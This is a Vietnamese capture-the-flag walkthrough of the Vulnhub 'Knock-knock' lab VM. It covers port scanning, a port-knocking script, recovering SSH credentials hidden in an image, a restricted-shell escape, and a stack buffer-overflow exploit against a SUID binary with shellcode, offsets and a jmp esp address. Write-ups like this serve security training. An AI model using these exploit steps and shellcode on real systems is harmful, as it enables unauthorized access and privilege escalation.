# Knock - knock Vulnhub Walkthrough
## Bước 1: Dò quét
Tìm Ip của VM knock knock
netdiscover -i eth0 -r 192.168.18.0/24
![image](https://hackmd.io/_uploads/S19I4xy8a.png)
![image](https://hackmd.io/_uploads/rywwNlkUT.png)


knock knock có IP là 192.168.18.143
Dùng nmap scan version và OS 
nmap -sT -sV -O 192.168.18.143
![image](https://hackmd.io/_uploads/HkS9Vl1U6.png)

nmap bị chặn scan version và OS
scan port
	nmap 192.168.18.143 -p-
![image](https://hackmd.io/_uploads/SyV6Vg186.png)

phát hiện port 1337 đang mở
Thử telnet vào port đó 
	telnet 192.168.18.143 1337
![image](https://hackmd.io/_uploads/BkkbBlyIp.png)

Nhận được 3 giá trị có vẻ như là các port 
Port Knocking là một kỹ thuật để kiểm soát quyền truy cập vào một cổng bằng cách chỉ cho phép người dùng hợp pháp truy cập vào dịch vụ đang chạy trên máy chủ. Nó hoạt động theo cách mà khi thực hiện đúng trình tự kết nối, tường lửa sẽ mở cổng đã bị đóng.

Dùng script để tự động connect đến các port này
script.py
```python=
#!/usr/bin/python 
import socket
import itertools
import sys
destination = "192.168.18.143"

def clean_up_ports (raw_string):
	if len(raw_string) <= 0:
		return None
	# Remove the first [
	raw_string = raw_string.replace('[','')
	# Remove the second ]
	raw_string = raw_string.replace(']','')
	#split by commas
	first_list = raw_string.split(',')
	# start e empty return list
	ports = []
	for port in first_list:
	# strip the whitespace around the string
	# and cast to a integer
		ports.append(int (port.strip()))
	return ports
def main():
	print "[+] Getting sequence"
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((destination, 1337))
	except Exception as e:
		print "[+] Unable to connect to %s on port 1337. %s" % (destination, e) 
		sys.exit(1)
	# receive the list 
	raw_list = sock.recv(20)
	# get the ports in a actual python list
	ports = clean_up_ports (raw_list)
	print "[+] Sequence is %s" % ports
	print "[+] Knocking on the door using all the possible combinations...\n"
	# Lets knock all of the possible combinations of the ports list
	for port_list in itertools.permutations (ports):
		print "[+] Knocking with sequence: %s" % (port_list,) 
	for port in port_list:
		print "[+] Knocking on port %s:%s" % (destination, port) 
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
		sock.settimeout(0.1)
		sock.connect_ex ((destination, port)) 
		sock.close()
	print "[+] Finished sequence knock\n"
if __name__  =='__main__':
	print "[+] Knock knock opener"
	main()
	print "[+] Done"
```



![image](https://hackmd.io/_uploads/BkrEBe1UT.png)

Bây giờ tiến hành scan lại 
 nmap -p-  192.168.18.143

![image](https://hackmd.io/_uploads/SJMIrgy8a.png)

Truy cập trên trình duyệt 

![image](https://hackmd.io/_uploads/B1_DBeJLp.png)

Xem mã nguồn thấy không có gì đặc biệt chỉ có ảnh knocknock.jpg

![image](https://hackmd.io/_uploads/SkrFSxy8a.png)

Dùng wfuzz tìm các file bị ẩn nhưng không có gì đặc biệt
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hc 404 http://192.168.18.143/FUZZ

Tải ảnh bên trên về máy
wget http://192.168.18.143/knockknock.jpg

Dùng strings thấy một thông tin đăng nhập có vẻ được mã hóa 

![image](https://hackmd.io/_uploads/SyHqHeJIp.png)

Đây là mã caesar với ROT 13 
Decode bằng Cyberchef 

![image](https://hackmd.io/_uploads/Syvsre1Ua.png)

Thu được:
nosaJ
fnk2Pj9Bj
Nhìn có vẻ hơi ngược khi đảo ngược lại 
Jason
jB9jP2knf
Đây có lẽ là tài khoản SSH của user Jason
username: Jason
password: jB9jP2knf

## Bước 2: Khai thác Buffer Overflow 

![image](https://hackmd.io/_uploads/H16CrlJ86.png)

Login SSH thành công.

Tìm thấy chương trình “tfc” có quyền SUID
![image](https://hackmd.io/_uploads/rkAyLgy8a.png)

Đây là chương trình mã hóa tập tin, đối số thứ nhất là tệp đầu vào (văn bản thuần túy) và đối số thứ hai là tệp đầu ra (văn bản mật mã), cả đầu vào và đầu ra đều phải có đuôi .tfc.
Do shell hạn chế nên cần gọi shell từ python để bypass
![image](https://hackmd.io/_uploads/HkQzLxyL6.png)

python -c "import pty; pty.spawn('/bin/bash')"

![image](https://hackmd.io/_uploads/HkomIxJUT.png)

Encrypt thử file in.tfc

![image](https://hackmd.io/_uploads/SkwOUekIT.png)

Có thể thấy khi đảo ngược thứ tự file thì sẽ giải mã được 
Bây giờ chúng ta hãy thử một file lớn để xem nó có lỗ hổng Tràn bộ đệm hay không.

![image](https://hackmd.io/_uploads/SyFYIlkLa.png)

Có tồn tại Buffer overflow
Dùng tool [checksec.sh](https://www.trapkit.de/tools/checksec/) để kiểm tra 

![image](https://hackmd.io/_uploads/HJThLe18a.png)

không có bất cứ sự bảo vệ nào 
Do gdb chưa được cài đặt trên máy mục tiêu nên ta phải tải chương trình tfc xuống Kali của mình để phân tích thêm.
scp jason@192.168.18.143:tfc /
Hoặc gửi từ máy mục tiêu scp tfc kali@192.168.18.145:tfc

![image](https://hackmd.io/_uploads/HJyR8eJIp.png)


Dùng gdb phân tích

![image](https://hackmd.io/_uploads/B1a0Ue18T.png)

Tại sao ở đây là 0x0675c916 mà không phải  là 0x41414141? 
Tiếp theo, cần tìm đâu là độ lệch để chỉ cần thay đổi EIP. Sau khi thử một số độ dài khác nhau và kiểm tra giá trị của địa chỉ trả lại bằng gdb. Cuối cùng đã tìm thấy phần bù để ghi đè lên địa chỉ trả về (4124 byte).

Do 4 'A' luôn bắt đầu bằng cùng một byte 'def0 5bab' trong tệp được mã hóa, Vì vậy, 'def0 5bab' có thể được sử dụng như một mẫu để xác định vị trí dữ liệu được mã hóa trong tệp core.

![image](https://hackmd.io/_uploads/HkWWwlyL6.png)
![image](https://hackmd.io/_uploads/rkmMPg186.png)


Tiếp theo, sử dụng msfelfscan để lấy địa chỉ jmp esp.
msfelfscan -j esp /root/tfc

![image](https://hackmd.io/_uploads/rJImDxJLp.png)

Dùng linux / x86 / exec để tạo shellcode
![image](https://hackmd.io/_uploads/BJ4rDlJ8T.png)

Tạo file payload.py
```python=
#/usr/bin/python

shellcode = "\xdb\xc6\xd9\x74\x24\xf4\x5a\xb8\x7e\xda\xf3\x36\x31\xc9\xb1\x0b\x83\xea\xfc\x31\x42\x16\x03\x42\x16\xe2\x8b\xb0\xf8\x6e\xea\x17\x99\xe6\x21\xfb\xec\x10\x51\xd4\x9d\xb6\xa1\x42\x4d\x25\xc8\xfc\x18\x4a\x58\xe9\x13\x8d\x5c\xe9\x0c\xef\x35\x87\x7d\x9c\xad\x57\xd5\x31\xa4\xb9\x14\x35"

content = 'A' * 4124
content += "\x93\x8e\x04\x08"               # 0x08048e93 jmp esp
content += "\x90" * 20                       # padding 20 NOPs to protect shellcode
content += shellcode
content += 'C' * (5000 - 4124 - 4 -20 -70)  # padding with 'C'

print content
```




copy core ra file exp.tfc bỏ qua 239056byte (từ 3a5d0 hex)
dd if=core of=exp.tfc skip=239056 count=5000 bs=1
![image](https://hackmd.io/_uploads/HJnOPxk86.png)

Chạy thử trên máy kali đã lên đc root 
![image](https://hackmd.io/_uploads/rkstPg1LT.png)

Bây giờ tải exp.tfc lên máy mục tiêu và khai thác 

![image](https://hackmd.io/_uploads/SyIiwl18T.png)

Lấy được flag

![image](https://hackmd.io/_uploads/r1P2wgJLa.png)



